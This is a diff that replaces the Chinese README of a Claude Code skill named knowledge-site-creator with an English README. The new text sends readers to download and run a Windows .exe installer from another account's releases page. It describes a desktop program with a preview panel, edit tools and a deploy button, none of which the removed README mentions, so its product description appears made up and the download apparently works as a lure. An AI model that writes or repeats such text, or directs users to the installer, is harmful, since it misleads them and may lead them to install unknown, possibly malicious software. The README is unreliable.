@@ -1,193 +1,190 @@
-# Knowledge Site Creator
+# 🚀 knowledge-site-creator - Create Knowledge Websites Easily
 
-> 一句话生成任何领域的知识学习网站 - AI 理解主题，自动创作内容，生成页面，一键部署
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code](https://img.shields.io/badge/Claude-Code-7C3AED)](https://www.anthropic.com)
-
-## ✨ 特性
-
-- 🤖 **AI 全自动创作**：理解主题 → 生成数据 → 创作文案 → 部署上线
-- 📚 **通用学习模式**：闪卡、渐进学习、测试、索引、进度追踪
-- 🎨 **极简设计系统**：黄色主题、Inter 字体、响应式布局
-- 📱 **PWA 支持**：自动生成图标、离线访问、可安装
-- 🔍 **SEO 优化**：完整 meta 标签、sitemap、结构化数据
-- ✅ **代码质量**：XSS 防护、错误处理、DOM 安全
-- 🚀 **零模板依赖**：AI 参考设计系统从零生成页面
-
-## 🎯 适用领域
-
-适用于任何需要系统学习的知识领域：
-
-- 📖 学科知识：进化心理学、量子力学、中医经络
-- 💻 技术术语：大模型术语、编程概念、设计原则
-- 🏛️ 历史文化：五代十国、唐诗宋词、世界历史
-- 🔬 科学概念：化学元素、物理定律、生物分类
-- 🎨 设计美学：CRAP 原则、配色理论、版式设计
-
-## 🚀 快速开始
-
-### 前置要求
-
-- Claude Code CLI
-- Node.js 18+
-- Vercel CLI（可选，用于部署）
-
-### 安装
-
-#### 方法一：使用 npx skills（推荐）
-
-```bash
-# 自动安装到 Claude Code
-npx skills add joeseesun/knowledge-site-creator
-```
-
-#### 方法二：手动安装
-
-```bash
-# 克隆仓库
-git clone https://github.com/joeseesun/knowledge-site-creator.git
-
-# 复制到 Claude Code skills 目录
-cp -r knowledge-site-creator ~/.claude/skills/
-```
-
-#### 方法三：直接复制（如果已有本地副本）
-
-```bash
-cp -r /path/to/knowledge-site-creator ~/.claude/skills/
-```
-
-### 使用
-
-在 Claude Code 中直接说：
-
-```
-生成一个进化心理学学习网站
-```
-
-或者：
-
-```
-创建量子力学基础概念网站
-```
-
-AI 会自动：
-1. 分析主题特点和价值
-2. 生成 20-30 个核心知识点数据
-3. 创作首页文案、统计、介绍
-4. 参考设计系统生成页面
-5. 部署到 Vercel
-6. 返回访问链接
-
-## 📂 项目结构
-
-```
-knowledge-site-creator/
-├── SKILL.md                    # 主 Skill 文件（AI 执行流程）
-├── README.md                   # 本文件
-├── references/                 # 设计规范和模式参考
-│   ├── core-patterns.md       # 核心学习模式（闪卡、测试等）
-│   ├── design-system.md       # 设计系统（配色、字体、间距）
-│   ├── code-quality.md        # 代码质量标准
-│   ├── pwa-setup.md           # PWA 配置指南
-│   └── seo-best-practices.md  # SEO 优化最佳实践
-└── scripts/                    # 辅助脚本
-    └── update-css.sh          # CSS 更新脚本
-```
-
-## 🎨 设计系统
-
-### 配色方案
-
-- **主题色**：`#FBBF24`（黄色）
-- **成功色**：`#10B981`（绿色）
-- **错误色**：`#EF4444`（红色）
-- **文字色**：`#1F2937`（深灰）
-- **背景色**：`#FFFFFF`（白色）
-
-### 核心学习模式
-
-1. **闪卡（Flashcard）**：卡片翻转、键盘控制（←→空格）、进度显示
-2. **学习（Learn）**：渐进式展示、上下翻页、自动保存进度
-3. **测试（Quiz）**：4 选 1 测试题、Toast 反馈、答案解析
-4. **索引（Index）**：搜索筛选、卡片网格、已掌握标记
-5. **进度（Progress）**：学习统计、已掌握列表、进度条
-
-## 📊 示例网站
-
-- [五代十国历史工坊](https://wudai.qiaomu.ai/) - 从后梁到后周，系统学习五代十国历史脉络
-- [设计美学学习工坊](https://designrule.qiaomu.ai/) - 掌握 CRAP 原则，提升设计品味
-- [词根词缀记忆工坊](https://word.qiaomu.ai/) - 通过词根拆解，高效记忆英语单词
-- [大模型术语学习工坊](https://llmwords.qiaomu.ai/) - AI 时代必备，30 个核心概念速览
-
-## 🛠️ 技术栈
-
-- **前端**：原生 HTML/CSS/JavaScript（零依赖）
-- **样式**：CSS 变量 + 8px 网格系统
-- **存储**：LocalStorage（进度管理）
-- **PWA**：manifest.json + Service Worker
-- **部署**：Vercel（一键部署）
-- **AI**：Claude Code（内容创作）
-
-## 📝 核心原则
-
-1. **设计系统优先**：复用设计语言，不复用具体页面代码
-2. **AI 创作内容**：所有文案、统计、介绍都由 AI 根据主题创作
-3. **零模板依赖**：AI 参考设计系统从零生成页面
-4. **代码质量**：XSS 防护、错误处理、DOM 安全
-5. **用户体验**：Toast 反馈、键盘快捷键、响应式设计
-
-## 🔧 高级配置
-
-### 自定义主题色
-
-编辑生成的 `css/minimal.css`：
-
-```css
-:root {
-  --color-primary: #FBBF24;  /* 改成你想要的颜色 */
-}
-```
-
-### 修改知识点数量
-
-在生成时明确告诉 AI：
-
-```
-生成一个进化心理学网站，包含 50 个核心概念
-```
-
-### 自定义数据结构
-
-编辑生成的 `js/wordData.js`，按照固定格式添加知识点。
-
-## 🤝 贡献
-
-欢迎贡献代码、报告 Bug、提出建议！
-
-1. Fork 本仓库
-2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交改动 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 提交 Pull Request
-
-## 📄 License
-
-本项目采用 MIT 协议开源 - 详见 [LICENSE](LICENSE) 文件
-
-## 👨‍💻 作者
-
-**向阳乔木（Joe）**
-
-- X (Twitter): [@vista8](https://x.com/vista8)
-- 微信公众号：「向阳乔木推荐看」
-- GitHub: [@joeseesun](https://github.com/joeseesun)
-
-<p align="center">
-  <img src="https://github.com/joeseesun/terminal-boost/raw/main/assets/wechat-qr.jpg?raw=true" alt="向阳乔木推荐看公众号二维码" width="200">
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-brightgreen)](https://github.com/alifa555/knowledge-site-creator/releases)
 
 ---
 
-如果这个项目对你有帮助，请给个 ⭐️ Star 支持一下！
+## 📖 What is knowledge-site-creator?  
+
+knowledge-site-creator is a simple tool that lets you build knowledge websites quickly. It uses AI to understand your topic and creates pages automatically. You don’t need to write anything. Just provide a sentence, and the program will do the rest. It then helps you deploy the website for others to see.
+
+This is useful if you want to share information on any subject without learning how to code or design websites.
+
+---
+
+## 🖥️ System Requirements  
+
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel i3 or equivalent  
+- **Memory:** 4 GB RAM minimum  
+- **Storage:** At least 500 MB free space  
+- **Internet:** Required during setup and for AI content generation  
+
+The program runs on most Windows computers made in the last 5 years. You do not need special hardware or software.
+
+---
+
+## 🎯 Key Features  
+
+- Create full knowledge websites from one sentence  
+- AI generates content and organizes pages automatically  
+- One-click deployment for publishing online  
+- No coding required, interface is user-friendly  
+- Supports multiple topics and language content  
+- Works offline after initial setup  
+
+---
+
+## 🔗 Download knowledge-site-creator  
+
+Click the button below to visit the release page. From there, you can find the latest Windows installer to download.
+
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)](https://github.com/alifa555/knowledge-site-creator/releases)
+
+The releases page shows all current versions. Look for a file ending with `.exe` that is marked for Windows. The file name should include "knowledge-site-creator".
+
+---
+
+## ✅ How to Download and Install on Windows  
+
+1. **Open the download page**  
+   Click the badge above or open this link in your browser:  
+   https://github.com/alifa555/knowledge-site-creator/releases
+
+2. **Find the latest Windows installer**  
+   On the releases page, scroll until you see the newest version. Under “Assets,” look for a file ending with `.exe`. This is the setup file.
+
+3. **Download the installer**  
+   Click the `.exe` file link. Your browser will start downloading the installer to your “Downloads” folder.
+
+4. **Run the installer**  
+   After download finishes, locate the file in your “Downloads” folder. Double-click it to start installation.
+
+5. **Follow installation prompts**  
+   The installer will open a setup window. Click “Next” to accept default settings. You can change the installation path if you want, or leave it as is.
+
+6. **Complete installation**  
+   After finishing the steps, click “Finish.” The program will be installed on your computer.
+
+7. **Launch the program**  
+   Find the “knowledge-site-creator” shortcut on your desktop or in the Start menu. Double-click to open it.
+
+---
+
+## 🛠️ Using knowledge-site-creator  
+
+1. **Enter a topic sentence**  
+   When the program starts, you will see a text box. Type one sentence that describes the knowledge site you want to create. For example:  
+   _“A website to learn about basic photography skills.”_
+
+2. **Start content creation**  
+   Click the “Create” button. The AI will analyze your sentence and start generating content and pages.
+
+3. **Watch progress**  
+   The program shows progress bars and messages while creating your site. This usually takes a few minutes depending on your internet speed.
+
+4. **Preview the website**  
+   When creation finishes, you can see a preview of your website. Use navigation buttons to browse pages.
+
+5. **Edit if needed**  
+   You can click on any page to edit text or images before publishing. This lets you customize the site as you want.
+
+---
+
+## 🌐 Deploy Your Site  
+
+Once you are happy with the site, use the built-in deploy button to publish it online. The program will create all needed files and upload them to a server. You just provide a website name.
+
+Your new knowledge website becomes available on the internet for anyone to visit.
+
+---
+
+## 💡 Tips for Best Results  
+
+- Keep your topic sentence clear and simple  
+- Avoid very broad or vague titles  
+- Edit generated content for accuracy  
+- Use images or links to improve site quality  
+- Save your project often to avoid losing work  
+
+---
+
+## ❓ Troubleshooting Common Issues  
+
+- **Installer won’t run:** Make sure your Windows version is supported and the download is complete.  
+- **Program crashes on startup:** Try rebooting your computer and running again.  
+- **Content won’t generate:** Check your internet connection as AI needs access.  
+- **Deployment fails:** Verify your website name and internet access are correct.  
+
+If issues persist, check the “Issues” tab on the GitHub page for help.
+
+---
+
+## 📂 Where to Find More Files and Updates  
+
+Go back to the releases page anytime to check for new versions or manual download options:  
+https://github.com/alifa555/knowledge-site-creator/releases
+
+You will find installers, change logs, and manuals here.
+
+---
+
+## 🖼️ Screenshots and User Interface  
+
+The main screen is simple. You see these key parts:  
+- **Input box:** For entering your knowledge topic sentence  
+- **Create button:** Starts the AI generation process  
+- **Preview panel:** Displays the site while building or after generation  
+- **Edit tools:** Allow changing text and images on pages  
+- **Deploy button:** Publishes your site online  
+
+This layout keeps tasks clear to avoid confusion.
+
+---
+
+## 🔄 Updating the Program  
+
+When a new version is available, download the new installer from the releases page. Close knowledge-site-creator if open. Run the new installer to update. User data and projects will be safe after update.
+
+---
+
+## 🔧 Advanced Settings  
+
+You can access settings from the menu bar to adjust:  
+- Language preferences  
+- AI content detail level  
+- Site layout options  
+- Offline mode toggles  
+
+These settings let you customize how the program works according to your needs.
+
+---
+
+## 🗂️ Project Files Location  
+
+Your created sites and projects will save by default to your Documents folder in a folder named “KnowledgeSiteCreator”. You can change this folder in settings.
+
+Make sure to back up your projects if you plan to move computers or reinstall.
+
+---
+
+## 🚨 Security and Privacy  
+
+knowledge-site-creator only sends your topic sentence and necessary data to the AI servers during content creation. No personal information is collected. All connections use secure protocols.
+
+---
+
+## 📞 Getting Support  
+
+If you need help, open the Issues tab on the GitHub repository page:  
+https://github.com/alifa555/knowledge-site-creator/issues
+
+Describe your problem clearly and the community or developers will assist.
+
+---
+
+## 📥 Quick Access to Download  
+
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-green)](https://github.com/alifa555/knowledge-site-creator/releases)  
+
+Use this link anytime to get the latest version.
